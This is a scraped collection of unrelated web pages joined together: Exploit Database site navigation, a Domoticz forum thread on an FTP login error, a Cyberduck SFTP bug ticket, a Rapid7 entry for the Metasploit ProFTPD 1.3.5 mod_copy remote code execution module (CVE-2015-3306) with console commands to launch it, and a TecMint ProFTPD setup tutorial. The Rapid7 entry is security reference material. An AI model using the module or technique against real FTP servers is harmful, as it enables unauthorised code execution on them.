Exploit Database by Offensive Security
Terms
Privacy
About Us
FAQ
©
Copyright 2019, Exploit Database
About The Exploit Database
×
The Exploit Database is maintained by Offensive Security, an information security training company
that provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is a
non-profit project that is provided as a public service by Offensive Security.
The Exploit Database is a CVE
compliant archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.
The Google Hacking Database (GHDB)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.
The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at DEFCON 13. Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.
After nearly a decade of hard work by the community, Johnny turned the GHDB
over to Offensive Security in November 2010, and it is now maintained as
an extension of the Exploit Database. Today, the GHDB includes searches for
other online search engines such as Bing,
and other online repositories like GitHub,
producing different, yet equally valuable results.
Close
Offensive Security Resources
×
Downloads
Certifications
Training
Services
Kali Linux
OSCP
Penetration Testing with Kali Linux (PWK)
Penetration Testing
Kali NetHunter
OSWP
Offensive Security Wireless Attacks (WiFu)
Advanced Attack Simulation
Kali Linux Revealed Book
OSCE
Cracking the Perimeter (CTP)
Application Security Assessment
OSEE
Advanced Web Attacks (AWAE)
OSWE
Metasploit Unleashed (MSFU)
KLCP
Free Kali Linux training
Close
Search The Exploit Database
×
Title
CVE
Type
dos
local
remote
shellcode
papers
webapps
Platform
AIX
ASP
BSD
BSD_PPC
BSD_x86
BSDi_x86
CGI
FreeBSD
FreeBSD_x86
FreeBSD_x86-64
Generator
Hardware
HP-UX
IRIX
JSP
Linux
Linux_MIPS
Linux_PPC
Linux_SPARC
Linux_x86
Linux_x86-64
MINIX
Multiple
NetBSD_x86
Novell
OpenBSD
OpenBSD_x86
OSX_PPC
OSX
PHP
Plan9
QNX
SCO
SCO_x86
Solaris
Solaris_SPARC
Solaris_x86
Tru64
ULTRIX
Unix
UnixWare
Windows_x86
Windows_x86-64
Windows
ARM
CFM
Netware
SuperH_SH4
Java
BeOS
Immunix
Palm_OS
AtheOS
iOS
Android
XML
Perl
Python
System_z
JSON
ASHX
Ruby
ASPX
macOS
Linux_CRISv32
eZine
Magazine
NodeJS
Alpha
Solaris_MIPS
Lua
Author
Content
Port
14
21
22
23
25
42
49
53
66
69
70
79
80
81
102
105
110
111
113
119
123
135
139
143
161
162
164
383
389
402
406
411
443
444
445
446
502
504
513
514
515
532
548
554
555
617
623
631
655
689
783
787
808
873
888
901
998
1000
1040
1089
1099
1100
1114
1120
1194
1235
1471
1521
1533
1581
1589
1604
1617
1723
1743
1761
1812
1858
1861
1900
1947
2000
2022
2049
2100
2103
2121
2125
2181
2242
2315
2375
2380
2381
2401
2480
2525
2640
2810
2812
2947
2954
2990
3000
3030
3050
3052
3128
3129
3181
3200
3217
3306
3333
3378
3460
3465
3500
3535
3632
3690
3790
3814
3817
4000
4002
4070
4081
4105
4111
4322
4343
4434
4501
4555
4592
4661
4750
4848
5000
5060
5061
5080
5081
5093
5151
5180
5247
5250
5272
5308
5432
5466
5554
5555
5600
5655
5666
5800
5803
5814
5858
5900
5984
6066
6070
6080
6082
6101
6112
6129
6502
6503
6660
6667
7001
7002
7070
7071
7080
7100
7144
7210
7272
7290
7426
7443
7510
7547
7649
7770
7777
7778
7787
7879
7902
8000
8001
8002
8004
8008
8020
8022
8023
8028
8030
8080
8081
8082
8088
8090
8181
8300
8400
8443
8445
8473
8500
8585
8619
8800
8812
8839
8880
8888
9000
9001
9002
9080
9090
9091
9100
9124
9200
9251
9256
9443
9447
9784
9788
9855
9876
9900
9987
9993
9999
10000
10001
10080
10202
10203
10443
10616
11000
11211
11460
12203
12221
12345
12397
12401
13327
13701
13722
13838
16992
18821
18881
19000
19810
19813
20000
20010
20031
20111
20171
22003
23423
25672
26000
27015
27700
28015
30000
30303
31337
32400
32674
32764
34205
37215
37777
37848
38292
40007
41523
44334
46824
48080
49152
50000
50496
52311
52789
52869
52986
53413
54345
54890
55554
55555
56380
57772
58080
62514
Tag
WordPress Core
Metasploit Framework (MSF)
WordPress Plugin
SQL Injection (SQLi)
Cross-Site Scripting (XSS)
File Inclusion (LFI/RFI)
Cross-Site Request Forgery (CSRF)
Denial of Service (DoS)
Code Injection
Command Injection
Authentication Bypass / Credentials Bypass (AB/CB)
Client Side
Use After Free (UAF)
Out Of Bounds
Remote
Local
XML External Entity (XXE)
Integer Overflow
Server-Side Request Forgery (SSRF)
Race Condition
NULL Pointer Dereference
Malware
Buffer Overflow
Heap Overflow
Type Confusion
Object Injection
Bug Report
Console
Pwn2Own
Traversal
Deserialization
Verified
Has App
No Metasploit
Search[Solved] FTP connection to NAS fails - Domoticz
Skip to content
Search
Advanced search
Quick links
Unanswered topics
Active topics
Search
Members
The team
FAQ
Wiki
Login
Register
Board index
Domoticz
Installation, Compiling, Permissions, Security and Starting
Search
[Solved] FTP connection to NAS fails
On various Hardware and OS systems:
pi / windows / routers / nas, etc
Moderator: leecollings
Post Reply
Print view
Search
Advanced search
3 posts
• Page 1 of 1
ReneF
Posts: 5 Joined: Friday 29 January 2016 14:46
Target OS: Raspberry Pi
Domoticz version: V2.3530
Location: Berkhout
Contact:
Contact ReneF
Send private message
[Solved] FTP connection to NAS fails
Quote
Post
by ReneF » Wednesday 03 February 2016 1:20
I implemented the Domoticz_backup.sh script according the Wiki (Daily backup to external hdd) with the only changes made in IP numbers and user name and password.
Running the test via a SSH connection I get a 530 access denied message.
(see below) On my NAS the user has all right's for access. Trying the path directly in a web browser works fine, including logging in on the NAS using the username and password
About to connect() to 192.168.1.40 port 21 (#0)
*
Trying 192.168.1.40...
* connected
* Connected to 192.168.1.40 (192.168.1.40) port 21 (#0)
* FTP 0x174afb8 state change from STOP to WAIT220
< 220 NASFTPD Turbo station 1.3.5a Server (ProFTPD) [192.168.1.40]
> USER “user”
* FTP 0x174afb8 state change from WAIT220 to USER
< 331 Password required for “user”
> PASS “password”
* FTP 0x174afb8 state change from USER to PASS
< 530 Login incorrect.
* Access denied: 530
* Closing connection #0
Does any one have a suggestion what could be the case?
Last edited by ReneF on Thursday 04 February 2016 0:00, edited 1 time in total.
Top
pepijn
Posts: 511 Joined: Friday 12 July 2013 13:19
Target OS: Raspberry Pi
Domoticz version:
Location: The Netherlands
Contact:
Contact pepijn
Send private message
Re: FTP connection to NAS fails
Quote
Post
by pepijn » Wednesday 03 February 2016 1:56
Try to remove the quotes
Top
ReneF
Posts: 5 Joined: Friday 29 January 2016 14:46
Target OS: Raspberry Pi
Domoticz version: V2.3530
Location: Berkhout
Contact:
Contact ReneF
Send private message
Re: FTP connection to NAS fails
Quote
Post
by ReneF » Wednesday 03 February 2016 11:09
Thanks Pepijn.
You're suggestion worked. Maybe a good idea to mention this in the wiki.
Secondly I discovered that the NAS does not allow to write to a directory that is not created before running this script (see below)
> CWD Domoticz_backup
< 550 Domoticz_backup: No such file or directory
* Server denied you to change to the given directory
Rene
Top
Post Reply
Print view
Display: All posts1 day7 days2 weeks1 month3 months6 months1 year
Sort by: AuthorPost timeSubject
Direction: AscendingDescending
3 posts
• Page 1 of 1
Return to “Installation, Compiling, Permissions, Security and Starting”
Jump to
General
↳   News & Updates
↳   General Discussion
↳   Bugs and Problems
↳   Other questions and discussions
↳   Suggestions
Domoticz
↳   Installation, Compiling, Permissions, Security and Starting
↳   Cameras
↳   Switches and Scenes
↳   Utility
↳   Temperature and Weather
↳   Heating/cooling
↳   OpenTherm gateway
↳   Third party and supplementary tools
↳   Android
↳   iOS
↳   Windows
↳   Kodi (XBMC)
↳   Domoboard
↳   Dashticz
↳   Design, usability and languages
↳   Language / Translation
Scripting & automation
↳   dzVents
↳   Bugs
↳   Examples & Solutions
↳   LUA
↳   Bash / PowerShell / Batch etc.
↳   Blockly
↳   Python
↳   PHP and all others
Hardware and Protocols
↳   Z-Wave
↳   Device information
↳   Others
↳   Zigbee
↳   Speech & Voice Systems
↳   433 & 868 transceiver
↳   RFLink Transceiver
↳   Rfxcom Transceiver
↳   DIY Hardware and Protocols
↳   ESP8266
↳   PiFace
↳   Raspberry Pi GPIO ( WiringPi )
↳   MySensors
↳   1-wire
Community
↳   Sales, Deals and Bargains..
↳   Deals & bargains
↳   Forum feedback
↳   Show your projects
↳   Projects on other sites
Who is online
Users browsing this forum: jkimmel and 0 guests
Board index
All times are UTC+02:00
Delete cookies
Members
The team
Powered by phpBB® Forum Software © phpBB Limited
Privacy
|
Terms#6361 ("Unknown host key" warning even though "Always" is chosen)
– Cyberduck
Toggle navigation
Changelog Cryptomator
Blog
Development
Help
Protocols
FTP SFTP WebDAV Amazon S3 Google Storage OpenStack Swift Microsoft Azure
Microsoft OneDrive Dropbox Google Drive
Backblaze B2 Joyent Triton DRACOON
Spectra BlackPearl iRODS
Local Filesystem
Download
Donate
Cyberduck
Mountain Duck
CLI
Cyberduck
Search:
LoginPreferencesAbout TracRegister
WikiTimelineRoadmapBrowse SourceView TicketsSearch
Context Navigation
← Previous TicketNext Ticket →
Opened on Nov 11, 2011 at 10:46:00 PM
Closed on Jun 12, 2012 at 4:19:50 PM
Last modified on Mar 22, 2013 at 10:26:58 AM
#6361
closed
defect
(worksforme)
"Unknown host key" warning even though "Always" is chosen
Reported by:
cyperpopyber
Owned by:
dkocher
Priority:
high
Milestone:
Component:
sftp
Version:
4.2.1
Severity:
normal
Keywords:
Cc:
Daps0l
Architecture:
Intel
Platform:
Mac OS X 10.7
Description
(last modified by dkocher)
hi,
i'm having the same problem as here #1671, but deleting the known_hosts did not help.
further more, i see, that with every "yes, store the key forever" klick, the key of the ftp server is added known_hosts again.
so i have a known_hosts with a lot of identical entries now.
any suggestions?
those are the only errors i see in the console:
11.11.11 22:44:48,081 Cyberduck: Error loading /Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin/Contents/MacOS/Disk Inventory X Finder CM:
dlopen(/Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin/Contents/MacOS/Disk Inventory X Finder CM, 262): no suitable image found.
Did find:
/Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin/Contents/MacOS/Disk Inventory X Finder CM: mach-o, but wrong architecture
11.11.11 22:44:48,081 Cyberduck: Cannot find function pointer AbstractCMPluginFactory for factory 29E65FF2-4AAE-11D9-A8A3-000393B64A0C in CFBundle/CFPlugIn 0x1ac090 </Users/user/Library/Contextual Menu Items/Disk Inventory X Finder CM.plugin> (bundle, not loaded)
i'm running lion 10.7.2 and cyberduck Version 4.1.3 (9045)
i remember, having this "trouble" with snow leopard too. that was an earlier version of cyberduck.
the ftp-server shows: 220 NASFTPD Turbo station 2.x 1.3.2e Server (ProFTPD)
(its a qnap nas)
Oldest first
Newest first
Threaded
Comments only
Change History (12)
comment:1
Changed on Nov 13, 2011 at 1:39:36 PM by dkocher
Component
changed from core to sftp
Description
modified (diff)
Owner
set to dkocher
comment:2
Changed on Nov 13, 2011 at 1:42:30 PM by dkocher
Summary
changed from me too: "Unknown host key" warning every time for SFTP, even though "Always" is chosen to "Unknown host key" warning even though "Always" is chosen
comment:3
Changed on Nov 15, 2011 at 8:56:22 PM by dkocher
Can you login to a guest account in OS X and test if you get the same trouble.
comment:4
Changed on Nov 16, 2011 at 9:42:43 PM by dkocher
Resolution
set to worksforme
Status
changed from new to closed
comment:5
follow-up:
↓ 6
Changed on Nov 20, 2011 at 6:49:03 PM by cyperpopyber
Thanks for the hint.
"Works for me" too.
Now I have to fiddle out, whats the problem on *my* Systems.
Cheers,
comment:6
in reply to:
↑ 5
Changed on Nov 20, 2011 at 10:03:53 PM by dkocher
Replying to cyperpopyber:
Thanks for the hint.
"Works for me" too.
Now I have to fiddle out, whats the problem on *my* Systems.
Cheers,
Please reopen the ticket if you can provide more information. I actively close tickets that miss a timely response as it is unlikely to find a resolution then. In this case I just have no idea what might be going on and can only do wild guesses not much educated. We have to narrow down the possible causes and the first step is to try it with another account.
comment:7
Changed on Apr 3, 2012 at 10:20:44 AM by Daps0l
Cc
Daps0l added
Resolution
worksforme deleted
Status
changed from closed to reopened
Version
changed from 4.1.3 to 4.2.1
Hello, i have exactly the same problem;
The problem seems to occur when the SSH server is running on a non-default port. For example my SSH server is running on port 11111 instead of 22.
Steps to reproduce:
Delete ~/.ssh/known_hosts
Connect to mypc.homeip.net:11111
Unknown host key -> check 'always' -> allow
1 line added to ~/.ssh/known_hosts
Disconnect
Connect to mypc.homeip.net:11111
Unknown host key -> check 'always' -> allow
1 line added to ~/.ssh/known_hosts (total = 2 lines now)
Disconnect
This continues forever, always adding another new line to the known_hosts.
So my guess is the problem probably has got something to do with the hashing of:
[mypc.homeip.net]:11111 ssh-rsa <hostkey>
for hosts with non default ports, versus:
mypc.homeip.net ssh-rsa <hostkey>
for default ports.
comment:8
Changed on Apr 3, 2012 at 12:39:46 PM by dkocher
Milestone
set to 4.3
Status
changed from reopened to new
comment:9
Changed on Apr 3, 2012 at 12:43:55 PM by dkocher
We do not take the server port number into account when verifying or adding keys, though.
comment:10
Changed on Apr 4, 2012 at 9:33:40 AM by dkocher
Added test in r9502.
comment:11
Changed on Jun 12, 2012 at 4:19:50 PM by dkocher
Resolution
set to worksforme
Status
changed from new to closed
I have tested here with running OpenSSH on port 222 on localhost with an empty known_hosts but cannot reproduce.
comment:12
Changed on Mar 22, 2013 at 10:26:58 AM by dkocher
Milestone
4.4 deleted
Note: See
TracTickets for help on using
tickets.
Download in other formats:
Comma-delimited Text
Tab-delimited Text
RSS Feed
Powered by Trac 1.0.4
By Edgewall Software.
Visit the Trac open source project athttp://trac.edgewall.org/ProFTPD 1.3.5 Mod_Copy Command Execution | Rapid7
Quick Cookie Notification
This site uses cookies, including for analytics, personalization, and advertising purposes.
For more information or to change your cookie settings, click here.
If you continue to browse this site without changing your cookie settings, you agree to this use.
I AGREE, LET’S GO!
View Cookie Policy for full details
Main Menu
Products
InsightIDR
User Behavior Analytics & SIEM
InsightVM
Vulnerability Management
InsightAppSec
Dynamic Application Security Testing
InsightConnect
Orchestration & Automation
InsightOps
Log Management
Metasploit
Penetration Testing
AppSpider
Application Security On-Premise
tCell by Rapid7
Application Monitoring & Protection
Services
Managed Services
Managed Detection & Response (MDR)
Managed Vulnerability Management
Managed Application Security
Consulting Services
Advisory Services
Incident Response Services
Penetration Testing Services
IoT Security Services
Training & Certification
Partners
Sales Partners
Technology Partners
Find a Partner
Research
Blog
Docs
Support
Free Trial
Helpful Links
Product Support
Product Pricing
Resource Library
Events & Webcasts
Training & Certification
News & Press Releases
About Rapid7
Products
The Rapid7 Insight Cloud
Rapid7 Insight is your home for SecOps, equipping you with the visibility, analytics, and automation you need to unite your teams and amplify efficiency.
Insight Cloud OverviewInsight Cloud Pricing Try Now
Insight Products
InsightIDR
User Behavior Analytics & SIEM
Free Trial
InsightVM
Vulnerability Management
Free Trial
InsightAppSec
Dynamic Application Security Testing
Free Trial
InsightConnect
Orchestration & Automation
Request Demo
InsightOps
Log Management
Free Trial
Metasploit
Penetration Testing
Free Trial
AppSpider
Application Security On-Premise
Free Trial
tCell by Rapid7
Application Monitoring & Protection
Request Demo
View All Products
&vert;   Search by Solution
Helpful Links
Product Support
Product Pricing
Resource Library
Events & Webcasts
Training & Certification
News & Press Releases
About Rapid7
Services
Rapid7 Global Services
Need a hand with your security program? From planning and strategy to full service support, our experts have you covered.
Incident Response
Need immediate help with a breach?
+1-844-RAPID-IR
Managed Services
Managed Detection & Response (MDR)
Managed Vulnerability Management
Managed Application Security
Consulting Services
Advisory Services
Incident Response Services
Penetration Testing Services
IoT Security Services
Training & Certification
View All Services
Helpful Links
Product Support
Product Pricing
Resource Library
Events & Webcasts
Training & Certification
News & Press Releases
About Rapid7
Partners
Sales Partners
Technology Partners
Find a Partner
Research
Home
Vulnerability & Exploit Database
Modules
en
English
Deutsch
日本語
Blog
Docs
Support
Sign In
Free Trial
Rapid7 Vulnerability & Exploit Database
ProFTPD 1.3.5 Mod_Copy Command Execution
Back to Search
ProFTPD 1.3.5 Mod_Copy Command Execution
Disclosed
04/22/2015
Created
05/30/2018
Description
This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5.
Any unauthenticated client can leverage these commands to copy files from any
part of the filesystem to a chosen destination. The copy commands are executed with
the rights of the ProFTPD service, which by default runs under the privileges of the
'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website
directory, PHP remote code execution is made possible.
Author(s)
Vadim Melihow
xistence <xistence@0x90.nl>
Platform
Unix
Architectures
cmd
Development
Source Code
History
References
CVE-2015-3306
EDB-36742
Module Options
To display the available options, load the module within the Metasploit console and run the commands 'show options' or 'show advanced':
msf > use exploit/unix/ftp/proftpd_modcopy_exec
msf exploit(proftpd_modcopy_exec) > show targets
...targets...
msf exploit(proftpd_modcopy_exec) > set TARGET < target-id >
msf exploit(proftpd_modcopy_exec) > show options
...show and set options...
msf exploit(proftpd_modcopy_exec) > exploit
Penetration testing software for offensive security teams.
Key Features
Collect and share all the information you need to conduct a successful and efficient penetration test
Simulate complex attacks against your systems and users
Test your defenses to make sure they’re ready
Automate Every Step of Your Penetration Test
Free Metasploit Pro Trial
View All Features
Time is precious, so I don’t want to do something manually that I can automate. Leveraging the Metasploit Framework when automating any task keeps us from having to re-create the wheel as we can use the existing libraries and focus our efforts where it matters.
– Jim O’Gorman | President, Offensive Security
;
Back to Top
Customer Support
+1-866-390-8113 (Toll Free)
Sales Support
+1-866-7RAPID7 (Toll Free)
Need immediate help with a breach?
+1-844-RAPID-IR
Solutions
All Solutions
Industry Solutions
Compliance Solutions
Support & Resources
Product Support
Resource Library
Customer Stories
Events & Webcasts
Training & Certification
IT & Security Fundamentals
Vulnerability & Exploit Database
About Us
Company
Leadership
News & Press Releases
Customers
Public Policy
Investors
Connect with Us
Contact
Blog
Support Login
Careers
© Rapid7
Legal Terms
|
Privacy Policy
|
Export Notice
|
Trust
Chat
Contact Us
Success! Thank you for submission. We will be in touch shortly.
Oops! There was a problem in submission. Please contact us.
Contact Us
We're happy to answer any questions you may have about Rapid7
Reason for Contact
General
Demo Request
Pricing
Professional Services
Request for Proposal
Select Product
Metasploit
InsightIDR
InsightVM
InsightOps
InsightAppSec
AppSpider
Nexpose
First Name
Last Name
Job Title
Company
Email Address
Phone
Country
State
I do not want to receive emails regarding Rapid7's products and services.
Please refer to our Privacy Policy or contact us at info@rapid7.com for more details
I am a consultant, partner, or reseller.
Submit
General:
info@rapid7.com
Sales:
+1–866–7–Rapid7
sales@rapid7.com
Support:
+1–866–390–8113(toll free)
support@rapid7.com
Incident Response:
1-844-RAPID-IR
More Contact InfoInstalling and Configuring ProFTPD Server in Ubuntu/Debian
Home
About
Free eBooks
Deals
Donate
Join TecMint
Linux Online Courses
Subscribe
Linux Hosting
A-Z Linux Commands
Linux News
Linux Distro’s
Interview Questions
Programming
Shell Scripting
Learn Python
Learn Awk
Linux Commands
Linux Tricks
Best Linux Tools
Certifications
RHCE Exam
RHCSA Exam
LFCE Exam
LFCS Exam
Guides
Docker Series
Postfix Mail
XenServer Series
RHEV Series
Clustering Series
LVM Series
RAID Series
KVM Series
iSCSI Series
Zentyal Series
Ansible Series
Django Series
Create GUI Apps
Monitoring Tools
Nagios
Zabbix
Cacti
Observium
Monitorix
Collectd
Collectl
MySQL Monitoring
FTP
12
Installing and Configuring ProFTPD Server in Ubuntu/Debian
by Hanny Helal | Published: September 9, 2014 |
Last Updated: January 7, 2015
Download Your Free eBooks NOW - 10 Free Linux eBooks for Administrators | 4 Free Shell Scripting eBooks
FTP servers are the piece of software that allows you to create a FTP connection between your local computer and a web server. ProFTPD is a FTP server for Unix/Linux servers, very configurable and very effective, it is free & open-sourced, released under the GPL license.
Install Proftpd in Ubuntu and Debian
In this article, we’ll explain how to install ProFTPD server on Ubuntu/Debian machines.
Step 1: Install ProFTPD Server
Of course, you need to install the software in order to use it. First make sure that all your system packages are up-to-date by running these following apt-get commands in the terminal.
$ sudo apt-get update
$ sudo apt-get upgrade
Now to install ProFTPD server, run in the terminal.
$ sudo apt-get install proftpd
While installing, it will ask you to choose the usage type you want for your ProFTPD server, you may choose the best mode that fits your needs.
Install Proftpd Server
Step 2: Configure ProFTPD Server
Before start using it, we’ll need to edit some files, the /etc/proftpd/proftpd.conf is the default configuration file for Ubuntu/Debian servers, to start editing it using the vi command, run.
$ sudo vi /etc/proftpd/proftpd.conf
Configure Proftpd Server
Press the “I” key to start editing the file. Now change the content of the file as shown it below.
ServerName: Make it your default server name.
UseIPV6: You may switch it to “Off“, if you don’t use it.
DefaultRoot : Uncomment this line to restrict users with their home folders.
RequireValidShell: Uncomment this line and make it “On” to enable logging in for users, even for those who doesn’t have a valid shell in /etc/shells to log in.
AuthOrder: Uncomment the line to enable the using of local passwords.
Port: This line defines the default port for the FTP server, it is 21 by default. If you want, you can define any custom port here.
SystemLog: The default log file path, you may change it if you want.
After making above changes as suggested, you can save the file, press the “ESC” key and write :x to save and quite .
Now restart the ProFTPD server using this command.
$ sudo service proftpd restart
During ProFTPD installation, a default “proftpd” user created automatically, but we’ll need to create a password for it, to do so, run.
$ sudo passwd proftpd
That’s it!. You can now go to following addresses on the browser, it will be up and running, it will ask you about the user name and the password.
ftp://youripaddress
OR
ftp://yourdomian.com
Login to Proftpd
In the User Name filed write “proftpd” and in the Password filed write the password that you set before for the proftpd user.
Proftpd Directory Listing
Step 3: Creating ProFTPD Users
As you noticed, you are in the default home directory for the “proftpd” user, which isn’t useful for us, thats why we are going to create a new user with the /var/www/ folder as the home folder, so we can access it easily.
To create a FTP user say “myproftpduser” run.
$ sudo useradd myproftpduser
To create a password for it.
$ sudo passwd myproftpduser
To change it’s home folder to /var/www/ run.
$ sudo usermod -m -d /var/www/ myproftpduser
You can also define user home directory with useradd command, while creating a new users in Linux, for more information and usage of useradd command, read our article at.
15 Examples of ‘useradd’ Command
Now restart the ProFTPD server using.
$ sudo service proftpd restart
And now you can access it from the FTP server easily, you may also use Filezilla or any other FTP client to access your FTP server as well if you want.
Step 4: Troubleshooting ProFTPD:
Any available error messages will be stored in /var/log/proftpd/proftpd.log by default, you may check this file if your ProFTPD server installation isn’t working, you must also note that sometimes it happens that the ProFTPD server lags and you can’t access the server due to the “Connection Refused” message, it is not a problem, all what you have to do is to keep restarting the ProFTPD server until it works (in case if there were no other errors).
Have you installed the ProFTPD server before? What do you think about it when comparing it to other FTP servers like wu-ftpd ?
Share
+
+
If You Appreciate What We Do Here On TecMint, You Should Consider:
Stay Connected to: Twitter | Facebook | Google Plus
Subscribe to our email updates: Sign Up Now
Get your own self-hosted blog with a Free Domain at ($3.45/month).
Become a Supporter - Make a contribution via PayPal
Support us by purchasing our premium books in PDF format.
Support us by taking our online Linux courses
We are thankful for your never ending support.
Tags: proftpd
View all Posts
Hanny Helal
A Linux & Foss user since 2010, working on many projects in the field of Free Software.
Your name can also be listed here. Got a tip? Submit it here to become an TecMint author.
Next story Setup Master-Slave DNS Server Using “Bind” Tools in RHEL/CentOS 6.5
Previous story 5 Reasons Why I Hate GNU/Linux – Do You Hate (Love) Linux?
You may also like...
13
How to Secure a FTP Server Using SSL/TLS for Secure File Transfer in CentOS 7
15 Feb, 2017
6
Installing FTP Server and Mapping FTP Directories in Zentyal PDC – Part 8
25 Apr, 2014
6
Setting Up a Secure FTP Server using SSL/TLS on Ubuntu
24 Feb, 2017
12 Responses
Comments12
Pingbacks0
John Doe II says:
May 4, 2018 at 11:39 am
Which is better, a ftp://youripaddress type FTP or a ftp://yourdomian.com type FTP? And if a ftp://yourdomian.com type is better, how do you make a domain/website in Linux?
Reply
Felipe Correa says:
June 22, 2017 at 9:02 am
How do I lock the user so he cannot go back to the www or var directory, and even the core? For the user to be able to send files and delete file, what do I have to do?
Reply
eren says:
May 25, 2017 at 7:32 pm
I wonder how to install proftpd on /opt directory
Reply
Priynkara says:
June 5, 2016 at 12:03 pm
Command:	PASS *******
Response:	530 Login incorrect.
Error:	Critical error: Could not connect to server
Status:	Disconnected from server
Status:	Connecting to 162.243.205.246:21…
Status:	Connection established, waiting for welcome message…
Status:	Insecure server, it does not support FTP over TLS.
Command:	USER sankapr
Response:	331 Password required for sankapr
Command:	PASS *******
Response:	530 Login incorrect.
Error:	Critical error: Could not connect to server
I set all the setting correctly. But This error occurred. Pls anyone tell me the solution for this
Reply
Ravi Saive says:
June 6, 2016 at 10:58 am
@Priynkara,
Have you restarted vsftpd after making configuration? if not do:
$ sudo /etc/init.d/vsftpd
If you still gets the same error, another important thing to verify that the user shell present in /etc/shells? Could you share your vsftpd configuration here?
Reply
Rami Kellesly says:
April 19, 2016 at 1:00 pm
I confgure on ubunu 14 runing on aws servers I get this:
Status:	Resolving address of ec2-54-213-162-181.us-west-2.compute.amazonaws.com
Status:	Connecting to 54.213.162.181:21…
Status:	Connection established, waiting for welcome message…
Response:	220 ProFTPD 1.3.5rc3 Server (ec2-54-213-162-181.us-west-2.compute.amazonaws.com) [172.31.25.20]
Command:	USER userftp
Response:	331 Password required for userftp
Command:	PASS ********
Response:	230 User userftp logged in
Command:	OPTS UTF8 ON
Response:	200 UTF8 set to on
Status:	Connected
Status:	Retrieving directory listing…
Command:	PWD
Response:	257 “/var/www” is the current directory
Command:	TYPE I
Response:	200 Type set to I
Command:	PASV
Error:	Connection timed out
Error:	Failed to retrieve directory listing
Reply
Ravi Saive says:
April 19, 2016 at 2:42 pm
@Rami,
Try to add these following lines to vsftpd.conf file.
pasv_enable=YES
pasv_min_port=10000
pasv_max_port=10000
will solve your problem…
Reply
finck says:
February 10, 2016 at 6:01 pm
you said to put it ON instead of OFF in your example (please change my comment)
Reply
finck says:
February 10, 2016 at 6:00 pm
hi, for RequireValidShell, you said to put ON instead on OFF in your example :
RequireValidShell: Uncomment this line and make it “On” to enable logging in for users, even for those who doesn’t have a valid shell in /etc/shells to log in.
to enable logging without shell, you have to put on Off, not on On
Reply
Olek says:
January 8, 2016 at 7:55 pm
Hi,
Thaks a lot for super tutorial !!!
Reply
Ricardo says:
July 22, 2015 at 1:03 pm
Hi,
RequireValidShell shoud be “no” for this tutorial to work :)
Thanks a lot
Reply
Olek says:
January 8, 2016 at 7:56 pm
Ricardo, thank for Your fix “no”.
Reply
Got something to say? Join the discussion. Cancel reply
Your email address will not be published. Required fields are marked *Comment Name *
Email *
Website
Save my name, email, and website in this browser for the next time I comment.
Notify me of followup comments via e-mail. You can also subscribe without commenting.
This site uses Akismet to reduce spam. Learn how your comment data is processed.
I
TecMint :
BEGINNER'S GUIDE FOR LINUX
Start learning Linux in minutes
Vi/Vim Editor BEGINNER'S GUIDE
Learn vi/vim as a Full Text Editor
Linux Foundation Certification
Exam Study Guide to LFCS and LFCE
Popular PostsRecent Comments
How to Add Linux Host to Nagios Monitoring Server Using NRPE Plugin
How to Install Nagios 4.3.4 on RHEL, CentOS and Fedora
Install Cacti (Network Monitoring) on RHEL/CentOS 7.x/6.x/5.x and Fedora 24-12
How to Install Google Chrome 75 On RHEL/CentOS 7 and Fedora 30
How to Install Ubuntu 16.10/16.04 Alongside With Windows 10 or 8 in Dual-Boot
Tim says:
How would you use this to build a custom system locally...
jesse says:
Great instructions except that I not having faith in the process...
JJ says:
Yes please, I really need to know how to do this...
Jason says:
The most common SQL coding interview questions are listed in Matthew...
rkumaram says:
I have successfully installed virtual domain postfix with dovecot. my server...
Linux System Administrator Bundle with 7-Courses (96% off)
Add to Cart - $69
Ending In: 3 days
Computer Hacker Professional Certification Course (96% Off)
Add to Cart - $59
Ending In: 4 days
Linux eBooks
Introducing Learn Linux In One Week and Go from Zero to Hero
RedHat RHCE/RHCSA Certification Preparation Guide
Linux Foundations LFCS/LFCE Certification Guide
Postfix Mail Server Setup Guide for Linux
Ansible Setup Guide for Linux
Django Setup Guide for Linux
Awk Getting Started Guide for Beginners
Citrix XenServer Setup Guide for Linux
Never Miss Any Linux Tutorials, Guides, Tips and Free eBooks
Join Our Community Of 150,000+ Linux Lovers and get a weekly newsletter in your inbox
YES! SIGN ME UP
Linux Monitoring Tools
Smem – Reports Memory Consumption Per-Process and Per-User Basis in Linux
Scout_Realtime – Monitor Server and Process Metrics in Linux
Load Testing Web Servers with Siege Benchmarking Tool
Real Time Interactive IP LAN Monitoring with IPTraf Tool
CBM – Shows Network Bandwidth in Ubuntu
Linux Interview Questions
10 Core Linux Interview Questions and Answers
25 Apache Interview Questions for Beginners and Intermediates
10 Interview Questions and Answers on Various Commands in Linux
11 Basic Linux Interview Questions and Answers
Practical Interview Questions and Answers on Linux Shell Scripting
Open Source Tools
10 Top Open Source Artificial Intelligence Tools for Linux
8 Best PDF Document Viewers for Linux Systems
10 Best Clipboard Managers for Linux
8 Best Video Editing Softwares I Discovered for Linux
26 Best IDEs for C/C++ Programming or Source Code Editors on Linux
Donate to TecMint
Contact Us
Advertise on TecMint
Linux Services
Copyright Policy
Privacy Policy
Career
Sponsored Post
